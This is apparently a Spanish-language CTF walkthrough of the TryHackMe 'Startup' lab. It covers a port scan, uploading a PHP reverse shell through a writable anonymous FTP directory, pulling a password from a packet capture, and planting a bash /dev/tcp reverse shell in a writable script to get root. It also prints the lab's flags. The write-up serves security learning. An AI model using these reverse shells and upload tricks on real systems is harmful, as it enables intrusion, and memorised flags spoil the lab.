# Writeup Startup - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.130.130.242 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la fase de reconocimiento con un escaneo exhaustivo de puertos para identificar los servicios expuestos y posibles vectores de entrada:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.130.130.242 -oN scan_startup.txt
```



### Resultados del Escaneo


```bash
Nmap scan report for 10.130.130.242
Host is up (0.052s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.130.81
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Podemos ver de que hay tres puertos abiertos en la máquina, FTP con posible acceso anónimo, SSH y HTTP. Antes de hacer nada, vamos a intentar acceder a la máquina por FTP a ver, que tenemos ahí.

---

## Enumeración

Al entrar por FTP, podemos hacerlo como anónimo y de primeras observamos una carpeta llamada "ftp", un archivo llamado "important.jpg" y otro llamado "notice.txt". Vamos a ver que hay en cada uno de ellos.



```bash
ls -la
```

![listado de directorios](/imgStartup/image.png)

Al intentar revisar el directorio, era de esperar que estuviese vacío, pero al descargar la imagen y el .txt, podemos ver contenido interesante.

![contenido del texto](/imgStartup/image2.png)

De momento, con la imagen podemos ya intuir que el usuario de la máquina es una tal "Maya" y que la imagen es un meme del videojuego "Among Us". Como en el resto de las máquinas, vamos a intentar a ver si hay texto oculto en la imagen usando la herramienta steghide.

```bash
steghide extract -sf important.jpg                             
Enter passphrase: 
steghide: the file format of the file "important.jpg" is not supported.
```

![imagen](/imgStartup/image3.png)

Vale, no podemos usar steghide, pero podemos usar zsteg para ver si hay texto oculto en la imagen.

```bash
zsteg important.jpg
```

---

## Explotación

Al intentarlo con Zsteg, tampoco obtenemos nada, por lo que iremos a Hydra para poder obtener la contraseña del usuario "maya".


```bash
Tras una fase de fuerza bruta infructuosa contra el servicio SSH, regresamos al servicio FTP. Se observa que el directorio `/ftp/` posee permisos de escritura globales (`drwxrwxrwx`), lo que permite la carga de archivos maliciosos para obtener ejecución remota de comandos.


Para subir el payload al servidor FTP y obtener la ansiada shell, usaremos una herramienta que usamos en los writeup anterior llamada "php-reverse-shell.php"

```bash
$VERSION = "1.0";
$ip = '192.168.130.81';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Ahora, para ejecutar la shell y obtener la ansiada shell, antes pondremos nuestra terminal en modo de escucha con el siguiente comando:

```bash
nc -lvnp 4444
```

Y ahora, para ejecutar la shell dentro del servidor FTP, usaremos el siguiente comando:

```bash
curl http://10.130.130.242/files/ftp/php-reverse-shell.php
```

Acceso exitoso al sistema. Hemos obtenido una shell inicial como `www-data`. Dado que los privilegios son limitados y no es posible acceder a los directorios personales de los usuarios, procedemos a realizar una enumeración local en busca de archivos sensibles o configuraciones erróneas.
---

## Escalada de Privilegios

Al explorar un rato la máquina, hemos encontrado otro archivo que llama mucho la atención llamado "suspicious.pcapng" en la carpeta /incidents. Vamos a descargarlo a nuestra máquina para analizarlo con Wireshark.

En la máquina víctima, nos ponemos en la carpeta donde está el archivo y ejecutamos el siguiente comando:

```bash
python3 -m http.server
```

En la máquina atacante, usamos el siguiente comando para descargar el archivo:

```bash
wget http://10.130.130.242:8000/suspicious.pcapng
```

Ahora, al revisar el archivo de Wireshark, hemos conseguido sacar la contraseña del usuario "lennie" que es "c4ntg3t3n0ughsp1c3". Ahora vamos a intentar entrar a la máquina con el usuario "lennie" y la contraseña "c4ntg3t3n0ughsp1c3" (concretamente, en el paquete 177 en mi caso).

```bash
ssh lennie@10.130.130.242
```
```bash
$ dir
Documents  scripts  user.txt
$ cat user.txt  
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

¡Ya tenemos la flag del usuario! Ahora vamos a intentar obtener la flag de root.

Lo primero que me ha llamdo la atención es la carpeta "scripts", que tiene el script dentro de la propia carpeta y tiene permisos 755 (es decir, cualquier usuario puede ejecutarlo), así que vamos a modificar el script para realizar de nuevo una reverse shell a la máquina para tener el acceso root.

```bash
nano planner.sh
```

![fallo](/imgStartup/image4.png)

Desgraciadamente, no podemos modificar el script, ya que no tenemos permisos de escritura, pero me llama mucho la atención el archivo "print.sh", ya que puede ser una posible entrada para realizar una escalada de privilegios.

Para generar la reverse shell con permisos de root, usaremos una página bastante útil llamada "revshells", ya que al introducir la IP y el puerto, nos da un comando para poder obtener una shell con permisos de root.

![generando shell](/imgStartup/image5.png)

Y ahora, introducimos el comando que nos ha escupido el generador en el archivo "print.sh" para obtener la shell con permisos de root.

```bash
#!/bin/bash
sh -i >& /dev/tcp/192.168.130.81/4445 0>&1  
```
Inmediatamente después de poner el nc en modo escucha, nos escupe la shell reversa con los permisos de root, y ya podremos obtener la flag de Root sin problema.

```bash
nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.130.81] from (UNKNOWN) [10.130.130.242] 42634
sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

## Flags

- **User Flag**: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
- **Root Flag**: THM{f963aaa6a430f210222158ae15c3d76d}
